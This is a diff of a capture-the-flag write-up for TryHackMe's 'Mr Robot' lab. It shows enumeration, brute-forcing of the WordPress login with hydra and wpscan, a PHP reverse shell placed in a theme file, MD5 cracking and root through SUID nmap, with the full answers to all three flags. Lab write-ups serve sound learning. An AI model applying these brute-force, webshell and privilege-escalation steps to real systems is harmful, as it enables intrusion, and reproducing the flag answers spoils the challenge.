@@ -1,175 +1,327 @@
-# Mr Robot THM
+# [Mr Robot CTF](https://tryhackme.com/room/mrrobot)
+
+> Darshan Patel
+
+## Overview
+
+| Tables | Description |
+| ------ | ----------- |
+| Challenge Name | Mr Robot CTF |
+| Difficulty | Medium |
+| Tags | mrrobot, root, beginner|
+
 
 ---
 
-![](./.assets/logo.jpeg)
 
+## Topic's
 
----
+- Network Enumeration
+- Web Enumeration
+- Brute Forcing (Wordpress)
+- Brute Forcing (Hash)
+- Abusing SUID/GUID
 
-## Index
-- [Enumeration](#enumeration)
-- [Finding Vunerabilities](#finding-vunerabilities)
-- [Reverse Shell and PrivEsc](#reverse-shell-and-privesc)
-- [Final Thoughts](#final-thoughts)
+## Network Enumeration
 
----
-
-```bash
-export IP=10.10.181.6
 ```
-
----
-
-### Enumeration
-
-```bash
-nmap -sC -sV -v -A $IP -oN nmap/initial.nmap
-```
-
-`initial`
-```
-# Nmap 7.91 scan initiated Tue Jul 20 16:06:26 2021 as: nmap -vvv -p 80,443 -sC -sV -A -v -oN nmap/initial.nmap 10.10.77.212
-Nmap scan report for 10.10.77.212
-Host is up, received syn-ack (0.14s latency).
-Scanned at 2021-07-20 16:06:28 +04 for 34s
-
-PORT    STATE SERVICE  REASON  VERSION
-80/tcp  open  http     syn-ack Apache httpd
-|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
+sudo nmap -sS -sC -sV -A -Pn 10.10.239.79
+[sudo] password for kali:
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 20:06 CEST
+Nmap scan report for 10.10.239.79
+Host is up (0.081s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
 |_http-server-header: Apache
 |_http-title: Site doesn't have a title (text/html).
-443/tcp open  ssl/http syn-ack Apache httpd
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
+443/tcp open   ssl/http Apache httpd
 |_http-server-header: Apache
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: 400 Bad Request
 | ssl-cert: Subject: commonName=www.example.com
-| Issuer: commonName=www.example.com
-| Public Key type: rsa
-| Public Key bits: 1024
-| Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2015-09-16T10:45:03
-| Not valid after:  2025-09-13T10:45:03
-| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
-| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
-| -----BEGIN CERTIFICATE-----
-| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
-| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
-| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
-| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
-| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
-| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
-| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
-| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
-| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
-|_-----END CERTIFICATE-----
+|_Not valid after:  2025-09-13T10:45:03
+Device type: general purpose|specialized|storage-misc|WAP|printer
+Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.4
+Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%), Linux 3.12 (89%), Linux 3.2 - 3.5 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
 
-Read data files from: /usr/local/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Tue Jul 20 16:07:02 2021 -- 1 IP address (1 host up) scanned in 36.03 seconds
+TRACEROUTE (using port 22/tcp)
+HOP RTT      ADDRESS
+1   36.87 ms 10.8.0.1
+2   82.64 ms 10.10.239.79
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.78 seconds
 ```
 
-There's not much here, except the fact we know that our exploit will be via HTML and likely through some sort of RFI.
-
-We should start enumerating the website with `gobuster` to find potential weaknesses
-
-```bash
-gobuster dir -u $IP -w ~/wordlists/website_dir/directory-list-2.3-small.txt -o gobuster/buster_small.gobuster
 ```
-(Note increasing the amount of threads is _not **recommended**_)
-
-```
-/images               (Status: 301) [Size: 236]
-/blog                 (Status: 301) [Size: 234]
-/sitemap              (Status: 200) [Size: 0]
-/rss                  (Status: 301) [Size: 0]
-/login                (Status: 302) [Size: 0]
-/0                    (Status: 301) [Size: 0]
-/admin                (Status: 301) [Size: 235]
+sudo nikto -host http://10.10.239.79
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.239.79
++ Target Hostname:    10.10.239.79
++ Target Port:        80
++ Start Time:         2020-09-29 20:41:30 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/5.5.29
 ```
 
-A few directories quickly reveal that this is a wordpress site.
+```
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.239.79
 
----
-
-### Finding Vunerabilities
-
-Wordpress and vunerability goes hand-in-hand, hence it is time to fire up `wp-scan`
-
-```bash
-wp-scan --url $IP -e vp,vt,u
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.239.79
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/29 20:07:17 Starting gobuster
+===============================================================
+/images (Status: 301)
+/blog (Status: 301)
+[ERROR] 2020/09/29 20:07:41 [!] Get http://10.10.239.79/about: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+/sitemap (Status: 200)
+/rss (Status: 301)
+[ERROR] 2020/09/29 20:07:47 [!] Get http://10.10.239.79/cgi-bin: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/09/29 20:07:56 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
+/login (Status: 302)
+[ERROR] 2020/09/29 20:08:10 [!] Get http://10.10.239.79/register: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/09/29 20:08:15 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
+[ERROR] 2020/09/29 20:08:20 [!] Get http://10.10.239.79/14: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+/0 (Status: 301)
+/feed (Status: 301)
+/video (Status: 301)
+/image (Status: 301)
+/atom (Status: 301)
+/wp-content (Status: 301)
+/admin (Status: 301)
+/audio (Status: 301)
+/wp-login (Status: 200)
+/intro (Status: 200)
+/css (Status: 301)
+/rss2 (Status: 301)
+/license (Status: 200)
+/wp-includes (Status: 301)
+/js (Status: 301)
+/Image (Status: 301)
+/rdf (Status: 301)
+/page1 (Status: 301)
+/readme (Status: 200)
+/robots (Status: 200)
+/dashboard (Status: 302)
+/%20 (Status: 301)
+[ERROR] 2020/09/29 20:39:17 [!] Get http://10.10.239.79/icon_arrow: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+Progress: 4814 / 220561 (2.18%)
 ```
 
-Looking at the results of it, there is nothing really standing out except `robots.txt` existing. Navigating to that reveals the first key as well as the name of what appears to be a wordlist for us to exploit.
+Found Robot.txt: `http://10.10.239.79/robots.txt`
 
-Considering the sheer size of this wordlist, I have reason to believe that it has duplicates.
-To confirm this, I run
+First Flag: `http://10.10.239.79/key-1-of-3.txt`
 
-```bash
-wc fosocity.dic
-# 858160
-# Remove duplicates
-cat fosocity | sort | uniq > pruned.txt
-wc pruned.txt
-# 11451
+`073403c8a58a1f80d943455fb30724b9`
+
+## Wordpress
+
+`http://10.10.239.79/wp-login`
+
+```
+hydra -L fsocity.dic -p test 10.10.239.79 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-29 20:50:41
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
+[DATA] attacking http-post-form://10.10.239.79:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username
+[80][http-post-form] host: 10.10.239.79   login: Elliot   password: test
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
 ```
 
-That's nearly 75 _times_ the amount of words we would have had to check.
+`Elliot`
 
-I prefer using wpscan to brute force wordpress sites. They tend to be easier on the eyes when debugging (@hydra)
-
-```bash
-wpscan --url $IP -U pruned.txt -P pruned.txt
+```
+sort fsocity.dic | uniq > fsocity_sorted.dic
 ```
 
-After waiting some time (this room is extremely slow) we gain the credentials for a user `Elliot` and their password `<<REDACTED>>`
+`hydra -l Elliot -P fsocity_sorted.dic 10.10.239.79 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"`
 
-We can now login as Elliot and check what we can modify to gain a reverse shell onto the box.
-
----
-
-### Reverse Shell and PrivEsc
-
-I notice they have the ability to modify the **php** code of themes. I chose the theme `twentyfifteen` and changed the `404.php` code to `revshell.php`
-
-I can now access the modified file from `http://$IP/wp-content/twentyfifteen/404.php` to gain a reverse-shell
-
-```bash
-netcat -lvnp 9999
----
-python -c "import pty; pty.spawn('/bin/bash')" # God I hate the default shell
+```
+[80][http-post-form] host: 10.10.157.219   login: "Elliot"  password: "ER28-0652"
 ```
 
-Curiously, instead of the typical `www-data` we have spawned as daemon.
+[http://10.10.239.79/wp-admin/](http://10.10.239.79/wp-admin/)
 
-Navigating to the only home directory of the only user on the box `robot`, I realise that I cannot access the `key-2-of-3.txt` flag but they have their password hash stored alongside it, which we can read.
+php_reverse_shell
 
-Cracking `robot`'s hash proves to be trivial, it is a simple MD5 hash that rockyou will crack in seconds.
+nc -nlvp 9001
 
-We grab the user flag and now look to escalate our priviledges. Getting `linpeas` on the machine was an unneeded pain (this box is slow...) and running it reveals a very interesting SUID binary: `nmap`.
+```
+python -c "import pty; pty.spawn('/bin/bash')"
 
-Checking GTFObins for PrivEsc related to nmap was a mild letdown as it only pointed to file read or write or shells but I fairly confident that I could escalate my priviledge without reading `root.txt` or `key-3-of-3.txt` indirectly.
+daemon@linux:/$ ls -la /home
+ls -la /home
+total 12
+drwxr-xr-x  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
+daemon@linux:/$ ls -la /home/robot
+ls -la /home/robot
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
 
-Doing some quick googling revealed a simple way to spawn a root shell with nmap:
+export TERM=xterm
 
-```bash
+cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+hashcat -m 0 --force hash /usr/share/wordlists/rockyou.txt
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: The pocl project
+====================================
+* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 512/1493 MB allocatable, 2MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.
+This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: MD5
+Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
+Time.Started.....: Tue Sep 29 22:09:23 2020 (0 secs)
+Time.Estimated...: Tue Sep 29 22:09:23 2020 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   123.2 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 40960/14344385 (0.29%)
+Rejected.........: 0/40960 (0.00%)
+Restore.Point....: 38912/14344385 (0.27%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: treetree -> loserface1
+
+Started: Tue Sep 29 22:09:15 2020
+Stopped: Tue Sep 29 22:09:24 2020
+```
+
+`abcdefghijklmnopqrstuvwxyz`
+
+```
+daemon@linux:/home/robot$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+`822c73956184f694993bede3eb39f959`
+
+```
+find / -perm -u=s -type f 2> /dev/null
+
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+
+[https://pentestlab.blog/2017/09/25/suid-executables/](https://pentestlab.blog/2017/09/25/suid-executables/)
+
+```
 nmap --interactive
+
 nmap> !sh
-$ whoami
+!sh
+# whoami
+whoami
 root
+# cd /root
+cd /root
+# ls -l
+ls -l
+total 4
+-rw-r--r-- 1 root root  0 Nov 13  2015 firstboot_done
+-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
 ```
 
-And we are now root! And we can access `key-3-of-3.txt` and this box is complete!
+`04787ddef27c3dee1ee161b21670b4e4`
 
----
+1. What is key 1?
 
-### Final Thoughts
+- `073403c8a58a1f80d943455fb30724b9`
 
-Fun box hampered by its _s-l-u-g-g-i-s-h_ performance. I love themed boxes and enjoyed playing around with the default page...despite how slow it is.
-I'd recommend this box, especially to premium users whose machines have extra resources.
-I will say that it definitely feels beginner to intermediate; and I'm only giving it intermediate based on the fact that it is extremely challenging for new users who are still getting to grips with enumeration and its interpretation due to how long it takes to correct errors.
+2. What is key 2?
 
-![](https://i.imgur.com/GafsLEl.png)
+- `822c73956184f694993bede3eb39f959`
+
+3. What is key 3?
+
+- `04787ddef27c3dee1ee161b21670b4e4`
